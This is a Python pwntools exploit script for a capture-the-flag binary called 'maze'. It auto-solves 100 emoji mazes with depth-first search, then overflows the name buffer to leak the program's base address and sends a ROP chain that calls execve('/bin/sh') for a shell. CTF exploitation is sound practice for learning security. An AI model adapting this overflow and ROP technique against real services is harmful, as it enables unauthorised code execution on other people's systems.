#-*- coding: utf-8 -*- 
from pwn import * 
binary_file = './maze' 
context.binary = binary_file 
# context.terminal = ['tmux', 'sp', '-h'] 
elf = ELF(binary_file) 
# context.log_level = 'debug' 
def dbg(breakpoint): 
    # print os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).read() 
    # raw_input() 
    gdbscript = '' 
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(io.pid)).readlines()[2], 16) if elf.pie else 0 
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint 
    gdbscript += 'c\n' 
    log.info(gdbscript) 
    gdb.attach(io, gdbscript) 
    time.sleep(1) 
dirs = [lambda x, y: (x + 1, y), 
        lambda x, y: (x - 1, y), 
        lambda x, y: (x, y - 1), 
        lambda x, y: (x, y + 1)] 
def mpath(stack, maze, x1, y1, x2, y2): 
    # stack = [] 
    stack.append((x1, y1)) 
    while len(stack) > 0: 
        curNode = stack[-1] 
        if curNode[0] == x2 and curNode[1] == y2: 
            #到达终点 
            # for p in stack: 
            #     print(p) 
            return True 
        for dir in dirs: 
            nextNode = dir(curNode[0], curNode[1]) 
            if maze[nextNode[0]][nextNode[1]] == 0: 
                #找到了下一个 
                stack.append(nextNode) 
                maze[nextNode[0]][nextNode[1]] = -1  # 标记为已经走过，防止死循环 
                break 
        else:#四个方向都没找到 
            maze[curNode[0]][curNode[1]] = -1  # 死路一条,下次别走了 
            stack.pop() #回溯 
    print("没有路") 
    return False 
def exploit(io): 
    s       = lambda data               :io.send(str(data))  
    sa      = lambda delim,data         :io.sendafter(str(delim), str(data)) 
    sl      = lambda data               :io.sendline(str(data)) 
    sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :io.recv(numb) 
    ru      = lambda delims, drop=True  :io.recvuntil(delims, drop) 
    irt     = lambda                    :io.interactive() 
    uu32    = lambda data               :u32(data.ljust(4, '\0')) 
    uu64    = lambda data               :u64(data.ljust(8, '\0')) 
     
    Wall   = '⬛' 
    Empty  = '⬜' 
    Finish = '🚩' 
    emoji = "😂😅😁😀🙂😐😑😯😟😞😖😳😨😱😭😵😩😠😡😤🙃😏😒🐮🍺" 
    # dbg(0x1192B2) 
    for i in range(100): 
        success('level%d'%(i+1)) 
        Start = emoji[ i-(i%4) : i-(i%4)+4 ] 
        ru('You will get flag when reaching level 100. Now is level %d\n' % (i+1)) 
        maze = io.recvrepeat(0.03*pow(i+1,0.5)).strip() 
        m = maze.replace(Start,'S').replace(Finish,'F').replace(Empty,'0').replace(Wall,'1') 
        mz = [] 
        maze = m.split('\n') 
        for h in range(len(maze)): 
            ae = [] 
            for l in range(len(maze[h])): 
                block = maze[h][l] 
                if block == '1': 
                    ae.append(1) 
                if block == '0': 
                    ae.append(0) 
                if block == 'F': 
                    ae.append(0) 
                    fX, fY = l, h 
                if block == 'S': 
                    ae.append(0) 
                    sX, sY = l, h 
            mz.append(ae) 
        path = [] 
        mpath(path,mz,sY,sX,fY,fX) 
        a1 = path[0] 
        path = path[1:] 
        p = '' 
        for a2 in path: 
            if a1[0] == a2[0]+1: 
                p += 'w' 
            if a1[0] == a2[0]-1: 
                p += 's' 
            if a1[1] == a2[1]+1: 
                p += 'a' 
            if a1[1] == a2[1]-1: 
                p += 'd' 
            a1 = a2 
        sl(p) 
    ru('You win!!!\nLeave your name:\n') 
    # sl(cyclic(300)) 
    sl( 
        flat( 
            cyclic(112), 
            0xc000000030, 0x8, 0x8, 
            'a'*0x88, 
            p8(0xcc) 
        ) 
    ) 
    ru('Your name is : ') 
    elf.address = u64(r(8)) - 0x206ac0  
    success('leak ELF base :0x%x'%elf.address) 
    for i in range(96,100): 
        success('level%d'%(i+1)) 
        Start = '\x00' 
        ru('You will get flag when reaching level 100. Now is level %d\n' % (i+1)) 
        maze = io.recvrepeat(0.03*(i+1)).strip() 
        m = maze.replace(Start,'S').replace(Finish,'F').replace(Empty,'0').replace(Wall,'1') 
        mz = [] 
        maze = m.split('\n') 
        for h in range(len(maze)): 
            ae = [] 
            for l in range(len(maze[h])): 
                block = maze[h][l] 
                if block == '1': 
                    ae.append(1) 
                if block == '0': 
                    ae.append(0) 
                if block == 'F': 
                    ae.append(0) 
                    fX, fY = l, h 
                if block == 'S': 
                    ae.append(0) 
                    sX, sY = l, h 
            mz.append(ae) 
        path = [] 
        mpath(path,mz,sY,sX,fY,fX) 
        a1 = path[0] 
        path = path[1:] 
        p = '' 
        for a2 in path: 
            if a1[0] == a2[0]+1: 
                p += 'w' 
            if a1[0] == a2[0]-1: 
                p += 's' 
            if a1[1] == a2[1]+1: 
                p += 'a' 
            if a1[1] == a2[1]-1: 
                p += 'd' 
            a1 = a2 
        sl(p) 
    ru('You win!!!\nLeave your name:\n') 
    mov_ptr_rdi = 0x00000000000cf53f#: mov qword ptr [rdi], rax; ret; 
    pop_rax = 0x0000000000074e29#: pop rax; ret; 
    pop_rdi = 0x0000000000109d3d#: pop rdi; ret; 
    syscall = 0xFFE2A 
    sl( 
        flat( 
            cyclic(112), 
            0xc000000030, 0x8, 0x8, 
            'a'*0x88, 
            elf.address+pop_rax,  "/bin/sh\x00", 
            elf.address+pop_rdi, 0xc000000000, 
            elf.address+mov_ptr_rdi, 
            elf.address+syscall, 0, 0x3b, 0, 0, 0 
        ) 
    ) 
    return io 

if __name__ == '__main__': 
    if len(sys.argv) > 1: 
        io = remote(sys.argv[1], sys.argv[2]) 
    else: 
        io = process(binary_file, 0) 
    exploit(io) 
    io.interactive() 